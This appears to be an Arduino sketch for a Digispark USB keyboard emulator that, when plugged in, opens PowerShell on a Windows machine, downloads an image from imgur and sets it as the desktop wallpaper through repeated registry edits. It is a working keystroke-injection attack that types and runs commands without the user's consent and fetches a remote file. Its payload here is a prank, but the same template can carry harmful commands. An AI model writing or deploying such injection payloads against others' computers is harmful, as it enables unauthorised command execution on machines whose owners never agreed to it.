#include "DigiKeyboardPtBr.h"

void setup() {
  // put your setup code here, to run once:

DigiKeyboardPtBr.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboardPtBr.delay(100);
DigiKeyboardPtBr.println("powershell");
DigiKeyboardPtBr.delay(100);
DigiKeyboardPtBr.println("$client = new-object System.Net.WebClient");
DigiKeyboardPtBr.delay(100);
DigiKeyboardPtBr.println("$client.DownloadFile(\"https://i.imgur.com/fVivgSZ.png\" , \"background.jpg\")");
DigiKeyboardPtBr.delay(100);
DigiKeyboardPtBr.println("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /t REG_SZ /d \"\" /f");
DigiKeyboardPtBr.delay(100);
DigiKeyboardPtBr.println("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /t REG_SZ /d \"%USERPROFILE%\background.jpg\" /f");
DigiKeyboardPtBr.delay(100);
DigiKeyboardPtBr.println("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /t REG_SZ /d \"%USERPROFILE%\background.jpg\" /f");
DigiKeyboardPtBr.delay(100);
DigiKeyboardPtBr.println("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /t REG_SZ /d \"%USERPROFILE%\background.jpg\" /f");
DigiKeyboardPtBr.delay(100);
DigiKeyboardPtBr.println("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaperStyle /t REG_SZ /d 2 /f");
DigiKeyboardPtBr.delay(100);
DigiKeyboardPtBr.println("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaperStyle /t REG_SZ /d 2 /f");
DigiKeyboardPtBr.delay(100);
DigiKeyboardPtBr.println("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaperStyle /t REG_SZ /d 2 /f");
DigiKeyboardPtBr.delay(100);
DigiKeyboardPtBr.println("exit");

}

void loop() {
  // put your main code here, to run repeatedly:

}
